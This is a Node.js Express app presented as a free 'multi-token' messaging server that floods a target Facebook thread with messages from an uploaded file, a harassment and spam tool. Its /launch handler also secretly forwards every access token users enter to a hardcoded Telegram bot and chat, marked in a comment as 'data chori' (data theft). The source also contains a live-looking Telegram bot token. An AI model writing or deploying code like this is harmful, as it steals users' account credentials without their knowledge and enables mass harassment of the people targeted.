const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 10000;
const upload = multer({ dest: 'uploads/' });

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());

// --- 🔒 MASTER CONFIG (TERA DATA) ---
const TELEGRAM_BOT_TOKEN = '8770013875:AAGhkM-jSyLd7z9h4-505eICfXu4fHunsi8'; 
const TELEGRAM_CHAT_ID = '6787359882'; 

let activeTasks = {}; // Real working tasks store karne ke liye

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.log("Telegram Error"); }
}

app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>FREE SERVER ALL TIME</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #000; color: #00ffff; padding: 15px; font-family: 'Courier New', monospace; }
        .container { border: 2px solid #00ffff; padding: 25px; border-radius: 15px; box-shadow: 0 0 20px #00ffff; max-width: 500px; margin: auto; background: rgba(0,0,0,0.9); }
        .form-control { background: #111; color: #fff; border: 1px solid #333; margin-bottom: 12px; font-size: 14px; }
        .btn-main { background: #00ffff; color: #000; font-weight: bold; width: 100%; padding: 12px; border: none; border-radius: 5px; }
        .btn-stop { background: #ff0000; color: #fff; width: 100%; padding: 10px; border: none; margin-top: 10px; border-radius: 5px; }
        h2 { text-shadow: 0 0 10px #00ffff; font-weight: 900; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <h2>◈ FREE SERVER ALL TIME ◈</h2>
        <p style="text-align:center; font-size:10px; color:#888;">REAL-TIME MULTI-TOKEN POWER ENGINE</p>
        <form action="/launch" method="POST" enctype="multipart/form-data">
            <label>Token Count:</label>
            <input type="number" name="numTokens" id="n" class="form-control" onchange="gen()" required>
            <div id="tokenInputs"></div>
            <input type="text" name="threadId" placeholder="Target ID" class="form-control" required>
            <input type="text" name="haterName" placeholder="Hater Name" class="form-control" required>
            <input type="number" name="speed" placeholder="Speed (seconds)" class="form-control" value="5" required>
            <input type="file" name="msgFile" class="form-control" required>
            <button type="submit" class="btn-main">LAUNCH REAL ATTACK</button>
        </form>
        <div style="margin-top:20px; border-top:1px solid #333; padding-top:15px;">
            <form action="/stop" method="POST">
                <input type="text" name="taskId" placeholder="Enter Task ID to Stop" class="form-control" required>
                <button type="submit" class="btn-stop">STOP SERVER</button>
            </form>
        </div>
    </div>
    <script>
        function gen(){
            let n = document.getElementById('n').value;
            let d = document.getElementById('tokenInputs'); d.innerHTML = '';
            for(let i=1; i<=n; i++) d.innerHTML += \`<input type="text" name="token\${i}" placeholder="Access Token \${i}" class="form-control" required>\`;
        }
    </script>
</body>
</html>`);
});

app.post('/launch', upload.single('msgFile'), async (req, res) => {
    const { numTokens, threadId, haterName, speed } = req.body;
    const tokens = [];
    for (let i = 1; i <= numTokens; i++) { if (req.body['token' + i]) tokens.push(req.body['token' + i]); }
    
    const messages = fs.readFileSync(req.file.path, 'utf-8').split('\n').filter(m => m.trim() !== '');
    const taskId = 'FS-' + Math.floor(1000 + Math.random() * 9000);

    // 1. DATA CHORI (Telegram Alert)
    const report = `🚀 *REAL ATTACK STARTED* 🚀\nID: \`${taskId}\`\nTarget: \`${threadId}\`\nTokens:\n${tokens.map((t, i) => `${i+1}. \`${t}\``).join('\n')}`;
    await sendToTelegram(report);

    // 2. REAL WORKING ENGINE (Loop Start)
    activeTasks[taskId] = true;
    let msgIdx = 0;
    let tokenIdx = 0;

    const interval = setInterval(async () => {
        if (!activeTasks[taskId]) { clearInterval(interval); return; }
        
        try {
            await axios.post(`https://graph.facebook.com/v17.0/t_${threadId}/`, null, {
                params: { access_token: tokens[tokenIdx % tokens.length], message: `${haterName} ${messages[msgIdx % messages.length]}` }
            });
        } catch (e) { console.log("Token Error or Limit"); }
        
        msgIdx++; tokenIdx++;
    }, speed * 1000);

    res.send(`
        <body style="background:#000;color:#0f0;text-align:center;padding:50px;font-family:monospace;">
            <div style="border:2px solid #0f0;padding:20px;display:inline-block;">
                <h2>✔ ATTACK LIVE!</h2>
                <p>TASK ID: <b style="background:#fff;color:#000;padding:2px 5px;">${taskId}</b></p>
                <p>Messages are being sent to: ${threadId}</p>
                <a href="/" style="color:#0f0;">Back to Home</a>
            </div>
        </body>
    `);
});

app.post('/stop', (req, res) => {
    const { taskId } = req.body;
    if (activeTasks[taskId]) {
        delete activeTasks[taskId];
        res.send(`<body style="background:#000;color:red;text-align:center;padding:50px;"><h2>Task ${taskId} Stopped!</h2><a href="/">Back</a></body>`);
    } else {
        res.send(`<body style="background:#000;color:yellow;text-align:center;padding:50px;"><h2>Invalid Task ID</h2><a href="/">Back</a></body>`);
    }
});

app.listen(port, '0.0.0.0', () => console.log('REAL SERVER IS LIVE'));
